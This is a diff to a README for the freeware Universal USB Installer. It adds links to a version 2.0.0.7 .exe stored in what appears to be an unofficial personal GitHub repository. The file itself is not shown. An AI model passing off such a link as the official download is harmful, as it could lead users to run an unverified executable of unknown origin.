@@ -4,7 +4,7 @@ Universal USB Installer
 ![universal-usb-installer-1_1-1-30](https://user-images.githubusercontent.com/92636873/137592258-955efadd-f725-41f9-bc19-f86e421a2ec7.png)
 
 Recent changes
-Universal USB Installer was last updated on 16.10.2021 and is available for download here in version 2.0.0.7.
+Universal USB Installer was last updated on 16.10.2021 and is available for download [here](https://github.com/cefrino/universal_usb_installer/blob/main/Universal-USB-Installer-2.0.0.7.exe) in version 2.0.0.7.
 
 With the free "Universal USB Installer" you can create bootable USB sticks. In addition, there are plenty of selectable operating systems and tools.
 
@@ -16,3 +16,6 @@ Ubuntu, Linux Mint, Debian, Fedora or openSUSE: The tool already suggests numero
 Windows users can also work with the tool, but you have to get the ISO files from Microsoft or create them yourself from a data carrier. However, the tool links to the "Windows 8 Release Preview".
 
 Tip: If you want to accommodate several operating systems on one stick, simply use YUMI from the same manufacturer.
+
+
+# [Download Universal USB Installer](https://github.com/cefrino/universal_usb_installer/blob/main/Universal-USB-Installer-2.0.0.7.exe)
